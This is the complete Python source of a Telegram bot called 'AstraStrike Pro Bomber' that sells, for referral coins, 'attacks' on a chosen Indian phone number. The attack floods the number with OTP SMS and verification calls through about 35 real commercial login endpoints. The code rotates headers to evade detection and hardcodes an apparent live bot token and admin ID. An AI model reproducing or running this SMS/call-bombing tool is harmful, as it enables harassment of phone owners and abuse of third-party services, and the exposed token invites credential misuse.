import asyncio
import aiohttp
import random
import json
from datetime import datetime
from typing import Dict, Optional
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramAPIError

# Configuration
CONFIG = {
    "TOKEN": "8413263809:AAHfQ4n2kMm9H-3qY4DsLFu0cWATzXNQ4gY",
    "ADMIN_ID": 8655103281,
    "COIN_PER_REFER": 5,
    "ATTACK_COST": 2,
    "STARTING_COINS": 10,
    "API_TIMEOUT": 8,
    "OTP_COUNT": 30,
    "CALL_COUNT": 5,
    "OTP_DELAY": 1.5,
    "CALL_DELAY": 5.0
}

class UserDatabase:
    """In-memory user database (replace with real DB for production)"""
    def __init__(self):
        self.users: Dict[int, Dict] = {}
    
    def get(self, user_id: int) -> Dict:
        return self.users.get(user_id, {"coins": 0, "refers": 0, "joined": None})
    
    def create(self, user_id: int) -> None:
        if user_id not in self.users:
            self.users[user_id] = {
                "coins": CONFIG["STARTING_COINS"],
                "refers": 0,
                "joined": datetime.now().isoformat()
            }
    
    def update_coins(self, user_id: int, amount: int) -> None:
        if user_id in self.users:
            self.users[user_id]["coins"] += amount
    
    def add_referral(self, user_id: int) -> None:
        if user_id in self.users:
            self.users[user_id]["refers"] += 1

db = UserDatabase()
bot = Bot(token=CONFIG["TOKEN"])
dp = Dispatcher()

class HeaderGenerator:
    """Generates random headers to avoid detection"""
    USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 11; Redmi Note 9) AppleWebKit/537.36"
    ]
    
    @classmethod
    def get(cls) -> Dict:
        return {
            "User-Agent": random.choice(cls.USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "Referer": "https://www.google.com/",
            "Origin": "https://www.google.com",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site"
        }

class AttackAPI:
    """Handles API calls for the attack"""
    
    @staticmethod
    async def call(session: aiohttp.ClientSession, api: Dict) -> Optional[int]:
        try:
            if api['method'] == "POST":
                async with session.post(
                    api['url'], 
                    json=api.get('data'), 
                    headers=HeaderGenerator.get(), 
                    timeout=CONFIG["API_TIMEOUT"]
                ) as response:
                    return response.status
            else:
                async with session.get(
                    api['url'], 
                    headers=HeaderGenerator.get(), 
                    timeout=CONFIG["API_TIMEOUT"]
                ) as response:
                    return response.status
        except asyncio.TimeoutError:
            return None
        except Exception:
            return None

def get_attack_apis(phone: str) -> list:
    """Returns list of APIs for the attack"""
    apis = []
    
    # OTP APIs (30)
    otp_apis = [
        {"url": "https://preprod.kukufm.com/api/v1/login/otp/", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.lenskart.com/v1/user/otp", "method": "POST", "data": {"telephone": phone}},
        {"url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "data": {"mobileNumber": phone, "requestType": "SENDOTP"}},
        {"url": f"https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={phone}", "method": "GET"},
        {"url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.oyorooms.com/api/v1/auth/send-otp", "method": "POST", "data": {"mobile": phone}},
        {"url": "https://api.makemytrip.com/ma/api/1/user/login/send-otp", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": "https://api.grab.com/grabid/v1/otp/send", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": "https://api.shopclues.com/api/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": "https://api.paytm.com/v1/user/otp", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": "https://api.amazon.in/auth/otp", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": "https://api.flipkart.com/otp/generate", "method": "POST", "data": {"loginId": f"+91{phone}"}},
        {"url": "https://api.zomato.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.swiggy.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": "https://api.uber.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.olacabs.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": "https://api.rapido.in/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.dunzo.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": "https://api.bigbasket.com/v1/otp/send", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": "https://api.grofers.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.milkbasket.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": "https://api.practo.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.curefit.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": "https://api.1mg.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.netmeds.com/v1/otp/send", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": "https://api.pharmeasy.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.tata1mg.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": "https://api.apollopharmacy.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.medlife.com/v1/otp/send", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": "https://api.myntra.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}}
    ]
    
    # Call APIs (5)
    call_apis = [
        {"url": f"https://api.magicbricks.com/bricks/verifyOnCall.html?mobile={phone}", "method": "GET"},
        {"url": f"https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{phone}?callType=otpOnCall", "method": "GET"},
        {"url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "data": {"mobile": phone}},
        {"url": "https://api.zomato.com/v1/call_verification", "method": "POST", "data": {"phone": phone}},
        {"url": "https://api.uber.com/v1/call_verification", "method": "POST", "data": {"phone": phone}}
    ]
    
    apis.extend(otp_apis[:CONFIG["OTP_COUNT"]])
    apis.extend(call_apis[:CONFIG["CALL_COUNT"]])
    
    return apis

def create_main_keyboard():
    """Creates the main menu keyboard"""
    builder = InlineKeyboardBuilder()
    builder.button(text="🚀 Start Bomber", callback_data="bomb_panel")
    builder.button(text="💰 My Wallet", callback_data="wallet")
    builder.button(text="🔗 Refer & Earn", callback_data="refer")
    if CONFIG["ADMIN_ID"]:
        builder.button(text="⚙️ Admin Panel", callback_data="admin")
    builder.adjust(1)
    return builder.as_markup()

@dp.message(CommandStart())
async def start_command(message: types.Message):
    user_id = message.from_user.id
    db.create(user_id)
    
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit():
        referrer_id = int(args[1])
        if referrer_id != user_id and referrer_id in db.users:
            db.update_coins(referrer_id, CONFIG["COIN_PER_REFER"])
            db.add_referral(referrer_id)
            try:
                await bot.send_message(
                    referrer_id, 
                    f"✅ *New Referral!* +{CONFIG['COIN_PER_REFER']} Coins added to your wallet.",
                    parse_mode="Markdown"
                )
            except TelegramAPIError:
                pass
    
    await message.answer(
        f"👋 *Welcome {message.from_user.first_name}!*\n\n"
        f"🔥 *AstraStrike Pro Bomber* 🔥\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"⚡ *Status:* Active & Ready\n"
        f"🪙 *Attack Cost:* {CONFIG['ATTACK_COST']} Coins\n"
        f"🎁 *Bonus:* {CONFIG['STARTING_COINS']} Free Coins\n"
        f"📊 *Active Users:* {len(db.users)}",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )

@dp.callback_query(F.data == "wallet")
async def wallet_callback(callback: types.CallbackQuery):
    user_data = db.get(callback.from_user.id)
    await callback.message.edit_text(
        f"💳 *Wallet Status*\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"🪙 *Coins:* `{user_data['coins']}`\n"
        f"👥 *Referrals:* `{user_data['refers']}`\n"
        f"💰 *Earned:* `{user_data['refers'] * CONFIG['COIN_PER_REFER']}` Coins",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "refer")
async def refer_callback(callback: types.CallbackQuery):
    bot_info = await bot.get_me()
    referral_link = f"https://t.me/{bot_info.username}?start={callback.from_user.id}"
    await callback.message.edit_text(
        f"📢 *Referral Program*\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"✨ Get *{CONFIG['COIN_PER_REFER']} Coins* per referral!\n"
        f"🔗 *Your Link:* `{referral_link}`\n\n"
        f"💡 *Tip:* Share this link with friends to earn unlimited coins.",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "bomb_panel")
async def bomb_panel_callback(callback: types.CallbackQuery):
    await callback.message.answer(
        "🎯 *Target Number Required*\n"
        "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        "📱 Send a *10-digit Indian mobile number*\n"
        "⚡ *Format:* `XXXXXXXXXX`\n\n"
        f"💰 *Cost:* {CONFIG['ATTACK_COST']} Coins per attack",
        parse_mode="Markdown"
    )
    await callback.answer()

@dp.message(F.text.regexp(r'^\d{10}$'))
async def attack_handler(message: types.Message):
    user_id = message.from_user.id
    phone_number = message.text
    
    user_data = db.get(user_id)
    if user_data["coins"] < CONFIG["ATTACK_COST"]:
        await message.answer(
            f"❌ *Insufficient Coins!*\n"
            f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
            f"🪙 Needed: `{CONFIG['ATTACK_COST']}`\n"
            f"📦 Your balance: `{user_data['coins']}`\n\n"
            f"🔗 Use referral link to earn more coins!",
            parse_mode="Markdown"
        )
        return
    
    db.update_coins(user_id, -CONFIG["ATTACK_COST"])
    
    status_msg = await message.answer(
        f"⚡ *Initializing Attack*\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"🎯 *Target:* `{phone_number}`\n"
        f"💣 *Payload:* {CONFIG['OTP_COUNT']} OTP + {CONFIG['CALL_COUNT']} Calls\n"
        f"🔄 *Status:* Starting...",
        parse_mode="Markdown"
    )
    
    apis = get_attack_apis(phone_number)
    successful_hits = 0
    
    async with aiohttp.ClientSession() as session:
        for index, api in enumerate(apis):
            status = await AttackAPI.call(session, api)
            if status and 200 <= status < 300:
                successful_hits += 1
            
            delay = CONFIG["OTP_DELAY"] if index < CONFIG["OTP_COUNT"] else CONFIG["CALL_DELAY"]
            
            if (index + 1) % 5 == 0 or index == len(apis) - 1:
                try:
                    await status_msg.edit_text(
                        f"💣 *Attack in Progress*\n"
                        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
                        f"🎯 *Target:* `{phone_number}`\n"
                        f"📊 *Progress:* `{index + 1}/{len(apis)}`\n"
                        f"✅ *Success:* `{successful_hits}` hits\n"
                        f"🔄 *Status:* Running...",
                        parse_mode="Markdown"
                    )
                except TelegramAPIError:
                    pass
            
            await asyncio.sleep(delay)
    
    await status_msg.edit_text(
        f"✅ *Attack Completed!*\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"🎯 *Target:* `{phone_number}`\n"
        f"💣 *Sent:* `{len(apis)}` payloads\n"
        f"✅ *Delivered:* `{successful_hits}` requests\n"
        f"🪙 *Cost:* `{CONFIG['ATTACK_COST']}` coins\n"
        f"💎 *Remaining:* `{db.get(user_id)['coins']}` coins",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )

@dp.callback_query(F.data == "admin")
async def admin_panel(callback: types.CallbackQuery):
    if callback.from_user.id != CONFIG["ADMIN_ID"]:
        await callback.answer("⛔ Unauthorized access!", show_alert=True)
        return
    
    total_users = len(db.users)
    total_coins = sum(user["coins"] for user in db.users.values())
    total_refers = sum(user["refers"] for user in db.users.values())
    
    await callback.message.edit_text(
        f"👑 *Admin Panel*\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"👥 *Total Users:* `{total_users}`\n"
        f"🪙 *Total Coins:* `{total_coins}`\n"
        f"🔗 *Total Refers:* `{total_refers}`\n"
        f"💹 *Average Coins:* `{total_coins // total_users if total_users else 0}`",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )
    await callback.answer()

async def main():
    print("🚀 AstraStrike Pro Bomber V11")
    print("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯")
    print(f"✅ Bot Token: {CONFIG['TOKEN'][:10]}...")
    print(f"👑 Admin ID: {CONFIG['ADMIN_ID']}")
    print(f"💣 Attack Cost: {CONFIG['ATTACK_COST']} coins")
    print("⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯")
    print("🤖 Bot is running...")
    
    try:
        await dp.start_polling(bot)
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
    finally:
        await bot.session.close()

if __name__ == "__main__":
    asyncio.run(main())
